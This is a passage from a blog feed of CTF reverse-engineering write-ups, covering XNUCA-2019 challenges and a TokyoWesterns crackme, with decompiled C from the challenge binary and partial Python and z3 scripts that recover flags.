keyword">goto</span> LABEL_27<span class="token punctuation">;</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span></code></pre><p> among this function，<code>v11</code> is appearing before <code>cmp  edi, 436AEh</code> , and you can get its value by <code>Dynamic Commissioning</code>. The values in <code>*(&amp;ConsoleCursorInfo[0].dwSize + v18)</code> also similarly available.</p><p>v11:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831112031.png" class="lazyload"></p><p>*(&amp;ConsoleCursorInfo[0].dwSize + v18):</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831112747.png" class="lazyload"></p><p>Get Your flag:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>    key<span class="token operator">=</span><span class="token number">0xA991E504</span>    b<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x16</span><span class="token punctuation">,</span><span class="token number">0xe4</span><span class="token punctuation">,</span><span class="token number">0xb3</span><span class="token punctuation">,</span><span class="token number">0xbd</span><span class="token punctuation">]</span>    out<span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        out<span class="token operator">+=</span>chr<span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token punctuation">(</span>key<span class="token operator">>></span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x30</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> out<span class="token comment" spellcheck="true">#B1RD</span></code></pre><p>Concat the <code>B1RD</code> with <code>010000000000000001</code>.</p><blockquote><p>flag{B1RD010000000000000001}</p></blockquote><h2 id="ooollvm"><a href="#ooollvm" class="headerlink" title="ooollvm"></a>ooollvm</h2><p>This program is compiled with llvm…I think it is sick for me. Official solution：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190903145622.png" class="lazyload"></p><p><code>IDA Pro</code> is not fit this challenge. I used the <code>GUI version</code> of radare2 named <code>cutter</code>:</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831113914.png" class="lazyload"></p><p>As you can see, it is crazy. Once you want to do something like Viewing pseudocode，the tool will crash. So you only have one choice——<code>Dynamic Commissioning</code>.</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190831115350.png" class="lazyload"></p><p>Usually we use <code>angr</code> to solve this kind of challenge…So i’m glad to learn angr. </p><pre class=" language-html"><code class="language-html">#Symbol executionhttps://github.com/angr/angr-dochttps://github.com/angr/angrhttps://xz.aliyun.com/t/3990https://docs.angr.io/</code></pre><h2 id="damnV"><a href="#damnV" class="headerlink" title="damnV"></a>damnV</h2><p>Official solution：</p><p><img src="/images/placeholder.png" alt="" data-src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190903221744.png" class="lazyload"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XNUCA-2019，Wonderful but crazy challenges…&lt;/p&gt;
    
    </summary>
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/categories/Binary/"/>
    
    
      <category term="Binary" scheme="http://www.yof3ng.xyz/tags/Binary/"/>
    
      <category term="Reverse" scheme="http://www.yof3ng.xyz/tags/Reverse/"/>
    
  </entry>
  
  <entry>
    <title>Tokyo_easycrackme_Z3</title>
    <link href="http://www.yof3ng.xyz/2019/08/31/Tokyo-easycrackme-Z3/"/>
    <id>http://www.yof3ng.xyz/2019/08/31/Tokyo-easycrackme-Z3/</id>
    <published>2019-08-31T15:47:33.000Z</published>
    <updated>2019-08-31T15:48:49.010Z</updated>
    
    <content type="html"><![CDATA[<p>Learning z3!</p><a id="more"></a><p>I learn something about py z3 from this challenge today.</p><pre class=" language-c"><code class="language-c"><span class="token keyword">signed</span> __int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">signed</span> __int64 result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">char</span> <span class="token operator">*</span>j<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1F_1</span>  <span class="token keyword">char</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST1E_1</span>  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1Dh] [rbp-1B3h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+20h] [rbp-1B0h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+24h] [rbp-1ACh]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-1A8h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+2Ch] [rbp-1A4h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+30h] [rbp-1A0h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+34h] [rbp-19Ch]</span>  <span class="token keyword">int</span> v14<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+38h] [rbp-198h]</span>  <span class="token keyword">int</span> v15<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+3Ch] [rbp-194h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+40h] [rbp-190h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> ii<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+44h] [rbp-18Ch]</span>  <span class="token keyword">int</span> v18<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+48h] [rbp-188h]</span>  <span class="token keyword">signed</span> <span class="token keyword">int</span> jj<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+4Ch] [rbp-184h]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+58h] [rbp-178h]</span>  __int64 v21<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+70h] [rbp-160h]</span>  __int64 v22<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+78h] [rbp-158h]</span>  __int64 v23<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+80h] [rbp-150h]</span>  __int64 v24<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+88h] [rbp-148h]</span>  __int64 v25<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+90h] [rbp-140h]</span>  __int64 v26<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+98h] [rbp-138h]</span>  __int64 v27<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+A0h] [rbp-130h]</span>  __int64 v28<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+A8h] [rbp-128h]</span>  __int64 v29<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+B0h] [rbp-120h]</span>  __int64 v30<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+B8h] [rbp-118h]</span>  __int64 v31<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+C0h] [rbp-110h]</span>  __int64 v32<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+C8h] [rbp-108h]</span>  __int64 v33<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+D0h] [rbp-100h]</span>  __int64 v34<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+D8h] [rbp-F8h]</span>  __int64 v35<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+E0h] [rbp-F0h]</span>  __int64 v36<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+E8h] [rbp-E8h]</span>  __int64 s1<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+F0h] [rbp-E0h]</span>  __int64 v38<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+F8h] [rbp-D8h]</span>  __int64 v39<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+100h] [rbp-D0h]</span>  __int64 v40<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+108h] [rbp-C8h]</span>  __int64 v41<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+110h] [rbp-C0h]</span>  __int64 v42<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+118h] [rbp-B8h]</span>  __int64 v43<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+120h] [rbp-B0h]</span>  __int64 v44<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+128h] [rbp-A8h]</span>  <span class="token keyword">int</span> v45<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+130h] [rbp-A0h]</span>  __int64 v46<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1B0h] [rbp-20h]</span>  __int64 v47<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1B8h] [rbp-18h]</span>  <span class="token keyword">unsigned</span> __int64 v48<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+1C8h] [rbp-8h]</span>  v48 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> a1 <span class="token operator">==</span> <span class="token number">2</span> <span class="token punctuation">)</span>  <span class="token punctuation">{</span>    s <span class="token operator">=</span> a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>a2<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">39</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"TWCTF{"</span><span class="token punctuation">,</span> <span class="token number">6uLL</span><span class="token punctuation">)</span> <span class="token operator">||</span> s<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">125</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    s1 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v38 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v39 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v40 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v41 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v42 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v43 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v44 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v46 <span class="token operator">=</span> <span class="token string">'76543210'</span><span class="token punctuation">;</span>    v47 <span class="token operator">=</span> <span class="token string">'fedcba98'</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v46 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token punctuation">;</span> j <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v46 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>        <span class="token operator">++</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>s1 <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_400F00<span class="token punctuation">,</span> <span class="token number">0x40uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v21 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v22 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v23 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v24 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v25 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v26 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v27 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v28 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v10 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> l <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> l <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>l <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v5 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">4</span> <span class="token operator">*</span> k <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> l<span class="token punctuation">]</span><span class="token punctuation">;</span>        v10 <span class="token operator">+</span><span class="token operator">=</span> v5<span class="token punctuation">;</span>        v11 <span class="token operator">^</span><span class="token operator">=</span> v5<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v21 <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v25 <span class="token operator">+</span> k<span class="token punctuation">)</span> <span class="token operator">=</span> v11<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v29 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v30 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v31 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v32 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v33 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v34 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v35 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v36 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v14 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v15 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">;</span> <span class="token operator">++</span>n <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        v6 <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> n <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">+</span> m<span class="token punctuation">]</span><span class="token punctuation">;</span>        v14 <span class="token operator">+</span><span class="token operator">=</span> v6<span class="token punctuation">;</span>        v15 <span class="token operator">^</span><span class="token operator">=</span> v6<span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v29 <span class="token operator">+</span> m<span class="token punctuation">)</span> <span class="token operator">=</span> v14<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v33 <span class="token operator">+</span> m<span class="token punctuation">)</span> <span class="token operator">=</span> v15<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v21<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_400F40<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v25<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_400F60<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v29<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_400FA0<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">memcmp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v33<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_400F80<span class="token punctuation">,</span> <span class="token number">0x20uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">memset</span><span class="token punctuation">(</span>v45<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v45<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;=</span> <span class="token number">31</span><span class="token punctuation">;</span> <span class="token operator">++</span>ii <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      v7 <span class="token operator">=</span> s<span class="token punctuation">[</span>ii <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">47</span> <span class="token operator">||</span> v7 <span class="token operator">></span> <span class="token number">57</span> <span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">96</span> <span class="token operator">||</span> v7 <span class="token operator">></span> <span class="token number">102</span> <span class="token punctuation">)</span>          v45<span class="token punctuation">[</span>ii<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>          v45<span class="token punctuation">[</span>ii<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>      <span class="token keyword">else</span>      <span class="token punctuation">{</span>        v45<span class="token punctuation">[</span>ii<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>v45<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dword_400FC0<span class="token punctuation">,</span> <span class="token number">0x80uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    v18 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span> jj <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> jj <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>jj <span class="token punctuation">)</span>      v18 <span class="token operator">+</span><span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>jj <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v18 <span class="token operator">!=</span> <span class="token number">0x488</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> s<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">53</span> <span class="token operator">||</span> s<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">102</span> <span class="token operator">||</span> s<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">56</span> <span class="token operator">||</span> s<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">55</span> <span class="token operator">||</span> s<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">50</span> <span class="token operator">||</span> s<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">52</span> <span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"incorrect"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Correct: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span>  <span class="token punctuation">{</span>    <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token string">"./bin flag_is_here"</span><span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> <span class="token number">0x12uLL</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> <span class="token number">1LL</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>This exp can’t get right flag.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment" spellcheck="true">#sol:</span><span class="token keyword">def</span> <span class="token function">sum_exp</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> li<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        result <span class="token operator">+=</span> i    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">count_cipin</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    F <span class="token operator">=</span> <span class="token string">'0123456789abcdef'</span>    <span class="token keyword">for</span> l <span class="token keyword">in</span> F<span class="token punctuation">:</span>        <span class="token keyword">for</span> m <span class="token keyword">in</span> li<span class="token punctuation">:</span>            <span class="token keyword">if</span> m <span class="token operator">==</span> ord<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>                result<span class="token punctuation">[</span>int<span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">+=</span><span class="token number">1</span>    <span class="token keyword">return</span> result<span class="token keyword">def</span> <span class="token function">count_add21</span><span class="token punctuation">(</span>li<span class="token punctuation">)</span><span class="token punctuation">:</span>    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    F <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> m <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token 